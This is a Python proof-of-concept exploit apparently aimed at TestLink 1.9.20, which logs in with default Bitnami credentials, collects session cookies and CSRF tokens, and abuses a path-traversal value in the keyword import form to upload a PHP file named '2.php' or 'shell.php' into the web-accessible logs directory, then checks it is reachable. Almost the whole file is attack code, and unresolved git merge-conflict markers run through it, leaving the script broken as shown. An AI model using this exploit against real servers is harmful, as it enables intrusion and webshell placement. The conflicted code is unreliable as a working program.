import requests
<<<<<<< HEAD
=======
import sys
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By


def login(host):
    firefox_opt = webdriver.FirefoxOptions()
    firefox_opt.add_argument("--headless")
    driver = webdriver.Firefox(options=firefox_opt)
    url = host + '/index.php'
    driver.get(url)

    driver.find_element_by_id("tl_login").clear()
    driver.find_element_by_id("tl_login").send_keys("user")
    driver.find_element_by_id("tl_password").clear()
    driver.find_element_by_id("tl_password").send_keys("bitnami")
    driver.find_element_by_id("tl_login_button").click()
<<<<<<< HEAD
    # driver.switch_to.parent_frame()
=======
    driver.switch_to.parent_frame()
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
    driver.switch_to.frame("mainframe")
    driver.find_element_by_xpath('/html/body/div[3]/div[2]/a[4]').click()
    driver.find_element_by_xpath('/html/body/div/div/form/input[7]').click()
    csrfguard = driver.find_element_by_xpath('/html/body/div/form[1]/input[1]')
    csrfguard_name = csrfguard.get_attribute('name')
    csrfguard_value = csrfguard.get_attribute('value')
    csrfname = driver.find_element_by_xpath('/html/body/div/form[1]/input[2]')
    csrf_name = csrfname.get_attribute('name')
    csrf_value = csrfname.get_attribute('value')
    print(csrf_name, ':', csrf_value)
    cookie = driver.get_cookies()
    phpsession = cookie[0]['value']
    testlink_cookie = cookie[1]['value']
    print("phpsession:", phpsession)
    print("testlink_cookie", testlink_cookie)
<<<<<<< HEAD
=======
    f = open("temp", 'w+')
    print("{phpsession}".format(phpsession=phpsession), file=f)
    print("{testlink_cookie}".format(testlink_cookie=testlink_cookie), file=f)
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
    return phpsession, testlink_cookie, csrfguard_value, csrf_value


def exp(host, phpsession, testlink_cookie, csrfguard_value, csrf_value):
    cookies = {
        'PHPSESSID': phpsession,
        'TESTLINK1920TESTLINK_USER_AUTH_COOKIE': testlink_cookie,
    }
    headers = {

        'Content-Type': 'multipart/form-data; boundary=---------------------------300685993123735673203366676955',
<<<<<<< HEAD
        # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
        # 'Origin':'http://192.168.56.105:8001',
        # 'Referer':'http://192.168.56.105:8001//lib/keywords/keywordsImport.php?tproject_id=1',
        # 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        # 'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
=======
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
    }
    data = '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFName"\n' \
           + '\n' \
           + '{csrfguard_value}'.format(csrfguard_value=csrfguard_value) \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFToken"\n' \
           + '\n' \
           + '{csrf_value}'.format(csrf_value=csrf_value) \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="importType"\n' \
           + '\n' \
           + '/../../../logs/2.php\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="MAX_FILE_SIZE"\n' \
           + '\n' \
           + '409600\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="uploadedFile"; filename="2.php"\n' \
           + 'Content-Type: application/octet-stream\n' \
           + '\n' \
           + '11111\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="tproject_id"\n' \
           + '\n' \
           + '1\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="UploadFile"\n' \
           + '\n' \
           + 'Upload file\n' \
           + '-----------------------------300685993123735673203366676955--\n'
    response = requests.post(host + '/lib/keywords/keywordsImport.php',
                             cookies=cookies, data=data, headers=headers, verify=False)
<<<<<<< HEAD
   #  cookies = {
   #      'PHPSESSID': phpsession,
   #      'TESTLINK1920TESTLINK_USER_AUTH_COOKIE': testlink_cookie,
   #  }
   #  headers = {
   #
   #      'Content-Type': 'multipart/form-data; boundary=-----------------------------300685993123735673203366676955',
   #      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
   #      'Origin':'http://192.168.56.105:8001',
   #      'Referer':'http://192.168.56.105:8001//lib/keywords/keywordsImport.php?tproject_id=1'
   #  }
   #  data = '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="CSRFName"\n' \
   #         + '\n' \
   #         + '{csrfguard_value}'.format(csrfguard_value=csrfguard_value) \
   #         + '\n' \
   #         + '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="CSRFToken"\n' \
   #         + '\n' \
   #         + '{csrf_value}'.format(csrf_value=csrf_value) \
   #         + '\n' \
   #         + '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="importType"\n' \
   #         + '\n' \
   #         + '/../../../logs/1.php\n' \
   #         + '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="MAX_FILE_SIZE"\n' \
   #         + '\n' \
   #         + '409600\n' \
   #         + '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="uploadedFile"; filename="1.php"\n' \
   #         + 'Content-Type: application/octet-stream\n' \
   #         + '\n' \
   #         + '11111\n' \
   #         + '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="tproject_id"\n' \
   #         + '\n' \
   #         + '1\n' \
   #         + '-----------------------------300685993123735673203366676955\n' \
   #         + 'Content-Disposition: form-data; name="UploadFile"\n' \
   #         + '\n' \
   #         + 'Upload file\n' \
   #         + '-----------------------------300685993123735673203366676955--\n'
   #  print("data:", data)
   #  # g=requests.get(host + '/lib/keywords/keywordsImport.php?tproject_id=1',
   #  #               cookies=cookies, headers=headers, verify=False)
   #  # print('g', g.status_code)
   # # print('g',g.text)
   #  response = requests.post(host + '/lib/keywords/keywordsImport.php',
   #                           cookies=cookies, data=data,headers=headers,verify=False)
    print(response.headers)
    print("有东西吗",response.status_code)
    print(response.text)
=======
    print("status_code",response.status_code)
    check = requests.get(host + '/logs/2.php',
                             cookies=cookies, headers=headers)
    print("shell content:",check.content)

>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff

def exp2(host):
    cookies = {
        'PHPSESSID': 'iaue0f0mntpatc23ibr1psbp8v',
        'TESTLINK1920TESTLINK_USER_AUTH_COOKIE': '45503b85fa85a8d56d745c6ceb3ef955853c19584bee69cd05d5bce2b872bee6',
    }
    headers = {

        'Content-Type': 'multipart/form-data; boundary=---------------------------300685993123735673203366676955',
<<<<<<< HEAD
        # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
        # 'Origin':'http://192.168.56.105:8001',
        # 'Referer':'http://192.168.56.105:8001//lib/keywords/keywordsImport.php?tproject_id=1',
        # 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        # 'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
=======
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
    }
    data = '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFName"\n' \
           + '\n' \
           + 'CSRFGuard_410757499' \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="CSRFToken"\n' \
           + '\n' \
           + '47285f6808adff2998041ccb5ad6fa904852f89aa01ac0c81811c85d4ac9added355053b684bea940b61155abf1c27b73f9e7764f1517bb72720c337db2b4703' \
           + '\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="importType"\n' \
           + '\n' \
<<<<<<< HEAD
           + '/../../../logs/2.php\n' \
=======
           + '/../../../logs/shell.php\n' \
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="MAX_FILE_SIZE"\n' \
           + '\n' \
           + '409600\n' \
           + '-----------------------------300685993123735673203366676955\n' \
<<<<<<< HEAD
           + 'Content-Disposition: form-data; name="uploadedFile"; filename="2.php"\n' \
=======
           + 'Content-Disposition: form-data; name="uploadedFile"; filename="shell.php"\n' \
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
           + 'Content-Type: application/octet-stream\n' \
           + '\n' \
           + '11111\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="tproject_id"\n' \
           + '\n' \
           + '1\n' \
           + '-----------------------------300685993123735673203366676955\n' \
           + 'Content-Disposition: form-data; name="UploadFile"\n' \
           + '\n' \
           + 'Upload file\n' \
           + '-----------------------------300685993123735673203366676955--\n'
    response = requests.post(host + '/lib/keywords/keywordsImport.php',
                             cookies=cookies, data=data, headers=headers, verify=False)
    print('a',response.status_code)
<<<<<<< HEAD
    #print('a',response.text)
=======
    check = requests.get(host + '/logs/2.php',
                             cookies=cookies, headers=headers)
    print("shell content:",check.content)
    if check.status_code == 200:
        print("Poc Success!")
    else:
        print("Poc failed!") 
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff


if __name__ == '__main__':
   
    if len(sys.argv) != 2:
<<<<<<< HEAD
        print('Usages:exp.py blog_host')
        exit(0)
=======
         print('Usages:exp.py blog_host')
         exit(0)
>>>>>>> 4bbfa3c6f7172728365a0d3ea7cd33cef2648eff
    h = sys.argv[1]
    tup = login(h)
    phpsession = tup[0]
    testlink_cookie = tup[1]
    csrfguard_value = tup[2]
    csrf_value = tup[3]
    exp(h, phpsession, testlink_cookie, csrfguard_value, csrf_value)
    #exp2(h)